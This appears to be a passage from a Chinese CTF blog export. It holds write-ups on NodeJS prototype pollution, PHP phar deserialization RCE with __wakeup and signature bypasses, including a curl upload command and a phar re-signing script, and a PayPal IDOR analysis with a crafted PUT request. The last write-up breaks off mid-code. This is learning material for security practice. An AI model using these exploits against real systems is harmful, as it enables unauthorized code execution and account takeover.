<p>这行代码就会通过,因为对于 <code>dst</code> , <code>__proto__</code> 是一定存在的, 之后就会进入下一轮递归, 在下一轮递归中, 此时的 <code>dst</code> 就是的原来的 <code>dst[&#39;__proto__&#39;]</code>, 然后就会 for 循环遍历<code>src[&#39;__proto__&#39;]</code>的键名,此时的 <code>key</code> &#x3D; a, 进入到判断语句,此时判断语句不会通过, 因为<code>dst[&#39;__proto__&#39;]</code>中不存在属性 a, 然后就会进入到赋值语句:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dst[key] = src[key];</span><br></pre></td></tr></table></figure>

<p>此时上面这行代码就等效于</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">dst[&#x27;__proto__&#x27;][&#x27;a&#x27;] = src[&#x27;__proto__&#x27;][&#x27;a&#x27;] = 1</span><br></pre></td></tr></table></figure>

<p>就完成了污染,对于每一个 <code>Object</code> 类 ,我们在新建的之后调用 a 属性,都会沿着原型链找到 <code>Object[&#39;__proto__&#39;]</code>里的 a 属性,其中 a 属性被赋值成了 1.</p>
<p>这里有一点要注意,要确保 merge 操作前, src 经过 <strong>json 解析</strong>, 如果不经过解析,那么<code>__proto__</code>会被认定是原型,for 遍历时就会从他开始遍历,即这是的 <code>key</code> 就变成 a了。json 解析后 <code>__proto__</code> 才会被严格解析成一个键名, 而非是原型,即经过下列操作:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> dst = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(&#123; <span class="string">&#x27;__proto__&#x27;</span>:&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125; &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目代码的提交逻辑为:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/submit&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> jsonText = ctx.<span class="property">request</span>.<span class="property">rawBody</span> || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">DEFAULT</span> = &#123;</span><br><span class="line">            <span class="attr">date</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            <span class="attr">place</span>: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">insert2db</span>(<span class="title function_">merge</span>(<span class="variable constant_">DEFAULT</span>, data));</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>可以看到这里将我们传入的数据做了 json 解析然后放到 merge 函数里, 这里就能够触发原型污染了. 主要是怎么通过原型污染去获取到 flag 呢, 我们看其他文件, 发现<code>info.js</code>中存在代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的逻辑就是你传入一个时间戳,然后和他设置的最小时间戳做对比,把大的那个时间戳作为 SQL 的查询匹配条件. 这里的思路就很明显了,我们要把它所有的时间戳的记录全部调出来,就能拿到 flag.</p>
<p>注意这一行代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br></pre></td></tr></table></figure>

<p>这一行代码会判断 <code>minTimestamp</code> 是否为空如果是空就换成他设置的默认值, 这里就能触发 prototype 调用了, 如果我们在先前的参数中传入 <code>minTimestamp</code> ,给他赋一个极小的值. 之后在判断是否为空的时候,就会沿着原型链往上寻找,找到我们设置的值并赋上,然后后面的 SQL 语句就能全部调出来了.</p>
<p>最后构造 payload 为:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/payload.jpg"></p>
<p>构造完 payload 后, 重进一次主页就能看到 flag 了:</p>
<p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/result.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】Unserialize Again phar 文件反序列化</title>
    <url>/2023/11/08/NewStarCTF2023-Unserialize-Again/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】Unserialize-Again-phar-文件反序列化"><a href="#【NewStarCTF2023】Unserialize-Again-phar-文件反序列化" class="headerlink" title="【NewStarCTF2023】Unserialize Again phar 文件反序列化"></a>【NewStarCTF2023】Unserialize Again phar 文件反序列化</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>打开靶机后,进入页面就一个文件上传,然后抓包看源码提示我们看 cookies,然后 cookies 里面有 pairing.php, 访问之后得到题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>这个类这么长,只有 <code>__destruct()</code> 部分是有用的, 解题思路就是触发反序列化,然后在__destruct()函数实现 RCE.</p>
<h3 id="wakeup-绕过部分"><a href="#wakeup-绕过部分" class="headerlink" title="__wakeup 绕过部分"></a>__wakeup 绕过部分</h3><p>这里的 <code>__wakeup()</code> 函数会强制更改 user 的值,导致我们无法 RCE,至于 <code>__construct()</code> 构造函数, 如果类是反序列化构造的,那么就默认不会触发构造函数,不用管他就好,所以这里仅需要绕过 <code>__wakeup()</code>。‘</p>
<p>先来了解 <code>__wakeup()</code> 函数。</p>
<p><code>__wakeup()</code> 函数在反序列过程中会最先调用,这是因为如果对象在被序列化时持有对数据库连接、文件句柄或网络连接的引用，这些资源在序列化时不会被保存，因为它们通常是资源指针。当对象被反序列化时， <code>__wakeup()</code> 方法会重新建立这些连接。</p>
<p><code>__wakeup()</code> 通常在所有属性都恢复后执行。因此在 PHP 中如果序列化字符串被篡改，例如故意声明错误的属性数(实际 4 个属性,却声明了 5 个), PHP 无法成功恢复 5 个变量,就会跳过 <code>__wakeup()</code> 的执行。</p>
<p>所以这里序列化构造为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;God=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>然后更改一下属性的个数就好。</p>
<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h3><p>注意到代码 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line"><span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码的逻辑是, 从 GET 中取出 <code>pear</code> 的值, 然后通过<code>php://input</code> 读取 POST 过来的内容, 然后生成以 <code>pear</code> 的值命名, POST 为内容的文件, 文件会存放在当前目录下, 之后通过 GET 传入的 <code>apple</code> 来指定文件调用 <code>file_exists()</code> 。</p>
<p><code>file_exists()</code> 函数是个魔法函数, 当他读取 phar 文件时, 如果 phar 文件存在 <code>.metadata</code> , 他就会对里面的内容执行反序列化。</p>
<p>所以思路很明显,这里我们需要构造一个 phar 文件,上传,然后通过 <code>file_exists()</code> 执行反序列化实现 RCE。</p>
<h3 id="phar-文件签名绕过"><a href="#phar-文件签名绕过" class="headerlink" title="phar 文件签名绕过"></a>phar 文件签名绕过</h3><p>由于需要绕过 <code>__wakeup()</code> 函数, 我们要更改 phar 文件里面序列化的内容, 但是按照我的构造 phar 文件的方法,在 phar 文件在生成后, 是会根据 phar 文件的内容生成一个<strong>签名</strong>的, 如果我们篡改生成的 phar 文件,会导致签名校验不通过, 无法被识别成一个正确的 phar 文件,也就不会触发反序列化.</p>
<p>这里绕过签名的方式有两种:</p>
<ol>
<li>修改数据后再手动生成签名</li>
<li>tar压缩绕过</li>
</ol>
<p>我的做法是<strong>tar压缩绕过</strong>, 手动生成签名的方法会在文末再讨论.</p>
<p>这里引用了文章 <a href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a> 的内容。</p>
<p>phar 文件在经过 tar 压缩后,反序列化过程中会跳过签名的验证。原因是对于 gzip,bzip 文件, php 内置的 phar 文件读取函数在碰到他们的时候会调用对应的过滤器直接对他们做解压处理,然后在去反序列化解压后的内容,这个过程是会验证签名有效性的。而对于 tar 文件, 他会检查 tar 压缩包的内容是否有 <code>.phar/.metadata</code>, 如果有就会直接对 <code>metadata</code> 的内容进行反序列化, 并没有验证其签名。</p>
<p><strong>请注意该博主对分析 tar 文件时使用的 PHP 版本为 PHP7.2, 本文并没有验证 7.2 以后的 PHP 版本是否有修复该漏洞</strong></p>
<p>本题中的 PHP 版本为 PHP&#x2F;7.0.9, 所以确保能够使用 tar 压缩绕过签名验证。</p>
<p>这里在这里我没有使用 php 代码生成 phar 文件, 我选择去模拟phar 文件的构造,同时里面如果没有签名也是合法的(因为根本就不会检查,如果有签名,tar 作为一个外部的命令行工具,不知道 phar 文件的构造细节,直接 tar 压缩可能无法被反序列化执行), 这里需要在本地创建一个名为 <code>.phar</code> 的文件夹, 然后在文件夹里创建名为 <code>.metadata</code> 的文件, 通过 vim 打开, 将序列化结构粘贴到里面,然后保存。之后调用以下命令生成 tar 文件:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">tar -cf phar.tar .phar/</span><br></pre></td></tr></table></figure>


<p>生成 tar 文件后, 在 POST 上传即可(这里用了 curl -T 上传文件, 因为 burp 不好搞格式):</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST -T &quot;/Users/a214/Desktop/phar.tar&quot; &quot;http://f5c944ec-<span class="number">37</span>e2-<span class="number">4182</span>-bcaf-e7f3441012c9.node4.buuoj.cn:<span class="number">81</span>/pairing.php?pear=a.phar&amp;apple=phar://a.phar&quot; --header &quot;Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded&quot;</span><br></pre></td></tr></table></figure>

<p>最后上传就能 RCE 了, ls 看到 flag 名字后 cat 就能得到结果:</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/result.jpg"></p>
<h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解使用重写 phar 文件签名的形式, 去上传文件。但是本人在复现的过程中, 缕缕碰壁, 在这里记录我的踩坑历史。</p>
<h3 id="使用-010editor-或者其他二进制工具编辑-phar-文件"><a href="#使用-010editor-或者其他二进制工具编辑-phar-文件" class="headerlink" title="使用 010editor 或者其他二进制工具编辑 phar 文件"></a>使用 010editor 或者其他二进制工具编辑 phar 文件</h3><p>一般的文本编辑器,包括 vim, vscode, 自带的记事本再保存的时候都会更改文件的编码格式,导致再发送的过程中无法被正确识别成 phar 文件。</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image.png"></p>
<h3 id="在修改前请确认签名所使用的加密格式"><a href="#在修改前请确认签名所使用的加密格式" class="headerlink" title="在修改前请确认签名所使用的加密格式"></a>在修改前请确认签名所使用的加密格式</h3><p>网上包括官方题解的代码都是用 SHA1 进行加密, 一直不能通过, 这一点我卡了很久, 知道我仔细看:</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image-1.png"></p>
<p>这里的签名怎么是 32 个字节的, 一般的 SHA1 在加密后是 20 个字节, <strong>SHA256</strong>加密后是 32 个字节, 所以这类由于未知原因,本人本地 php 环境生成的 phar 文件是用<strong>SHA256</strong>进行加密的, 我们需要更改代码让他去用 SHA256 进行加密, 以下是更改后的加密代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/a214/Documents/IntelliJ/unserialize/a.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">40</span>] <span class="comment"># 32+8</span></span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 sha256 替换 sha1</span></span><br><span class="line">sig = hashlib.sha256(text).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入新文件时，包括了新的签名和文件末尾的非签名数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(text + sig + end)</span><br></pre></td></tr></table></figure>

<p>更改后上传文件, 就能拿到 flag 了:</p>
<p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image-2.png"></p>
<p>这里总结一下签名的加密格式:</p>
<p>签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1</p>
<p>下次在改签名时记得检验一下加密格式。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>phar</tag>
        <tag>反序列化</tag>
        <tag>签名加密</tag>
      </tags>
  </entry>
  <entry>
    <title>about</title>
    <url>/2023/09/15/about/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>这是一个用于记录学习笔记的博客，包括日常学习和练习题，比赛赛题的 WriteUp。</p>
<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>中山大学软件工程学院学生&#x2F;CTFer Web 方向&#x2F;音游玩家<br>我的 QQ：1789697833<br>欢迎来找我玩！</p>
]]></content>
  </entry>
  <entry>
    <title>【API安全漏洞学习】Paypal IDOR 漏洞 - 2019-7-30</title>
    <url>/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="【API安全漏洞学习】Paypal-IDOR-漏洞-2019-7-30"><a href="#【API安全漏洞学习】Paypal-IDOR-漏洞-2019-7-30" class="headerlink" title="【API安全漏洞学习】Paypal IDOR 漏洞 - 2019-7-30"></a>【API安全漏洞学习】Paypal IDOR 漏洞 - 2019-7-30</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Paypal 平台中存在企业账号与对应的子账号, 企业账号通过委托授权子账号来管理账号上的资金, 对于不同的子账号拥有<strong>不同的权限和功能</strong>.<br>用一张图来理解就是:</p>
<p><img src="/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/image.png"></p>
<p>攻击者发现在这个 Paypal 的这个功能中存在 IDOR<br> 漏洞, 能够通过实现子账号间越权访问.</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>IDOR (Insecure Direct Object Reference), 又对象级授权问题, 它涉及到对Web应用程序或API中对象的不安全引用。这些对象通常是数据库记录、文件、目录等。当应用程序提供对这些对象的直接访问，并且没有适当地实施访问控制时，就会产生IDOR漏洞。</p>
<p>常见的 IDOR 漏洞有:</p>
<ol>
<li>用户数据泄露: 通过修改 URL 中的 ID 获取其他用户的隐私信息, 更严重的包括更改, 删除他人的信息.</li>
<li>文件访问和泄露: 对于本没有权限访问的文件, 通过修改 URL 中文件的编号来越权访问.</li>
</ol>
<p>在本次漏洞中, 攻击这发现“查看子账号”功能中有一个 URL 为 <code>https://www.paypal.com/businessmanage/users/1657893467745278998</code><br>其中 <code>user</code> 后面的 <code>1657893467745278998</code> 是子账号所绑定的企业账号 ID, 紧接着产生一个 HTTP PUT 请求, 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /businessmanage/users/api/v1/users? HTTP/1.1</span><br><span class="line">Host: www.paypal.com</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;1657893467745278998&quot;,&quot;accessPoint&quot;:&#123;&quot;privileges&quot;:[&quot;MANUAL_REFERENCE_TXN&quot;,&quot;VIEW_CUSTOMERS&quot;,&quot;SEND_MONEY&quot;],&quot;id&quot;:&quot;5994224506&quot;,&quot;accounts&quot;:[&quot;attacker@gmail.com&quot;]&#125;,&quot;roleID&quot;:0,&quot;roleName&quot;:&quot;CUSTOM&quot;,&quot;privilegeChanged&quot;:true,&quot;privilegeSecondaryName&quot;:&quot;A1&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>对于这个 API, 他通过之前上面的 API 发现第一个 <code>id</code> 参数值是企业账号的 id, 他很快就能确定第二个 <code>id</code> 是子账号的 id 了, 在这里第二个 <code>id</code> 的内容是简单的数值类型, 而且这个 <code>id</code> 是简单的递增或递减的, 是完全可以通过<strong>枚举</strong>的方式来获取到其他账号的 id 的,  将 <code>5994224506</code> 修改成 <code>5994224507</code> 就可以获取到同一企业账号其他子账号的权限了.</p>
<h2 id="漏洞实施"><a href="#漏洞实施" class="headerlink" title="漏洞实施"></a>漏洞实施</h2><p>攻击者根据上述漏洞, 不仅可以查看到关联的另一个子账号的信息, 还可以把响应的子账号密码进行修改就可以实现账号接管并且进行任意未授权的转账操作.</p>
<h2 id="漏洞启示"><a href="#漏洞启示" class="headerlink" title="漏洞启示"></a>漏洞启示</h2><p>Paypal 这个漏洞的产生有两个主要原因:</p>
<ol>
<li>子账号的 id 值可以通过枚举进行猜测</li>
<li>一但获取到 id 权限可以被扩大, 后续的转账操作没有二次对密码等进行确认</li>
</ol>
<p>预防这种漏洞, 在开发过程中需要留意:</p>
<ol>
<li>增强 id 值的随机性</li>
<li>在权限访问控制上, 要多次检验企业账号与子账号的绑定关系, 如每次访问涉及子账号权限的操作时, 要求其输入密码,或者输入绑定号等.</li>
</ol>
]]></content>
      <categories>
        <category>API安全</category>
        <category>漏洞剖析</category>
      </categories>
      <tags>
        <tag>API 安全</tag>
        <tag>IDOR</tag>
      </tags>
  </entry>
  <entry>
    <title>【月饼杯】Serialize - str_replace字符逃逸</title>
    <url>/2023/10/08/Serialize-%E6%B3%A8%E5%85%A5-str-replace%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Serialize-注入-str-replace漏洞利用"><a href="#Serialize-注入-str-replace漏洞利用" class="headerlink" title="Serialize 注入 - str_replace漏洞利用"></a>Serialize 注入 - str_replace漏洞利用</h1><p>题目来自月饼杯 web1_此夜圆<br>题目代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span></span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__construct</span>(<span class="params">$uname,$password</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>($this-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                echo <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        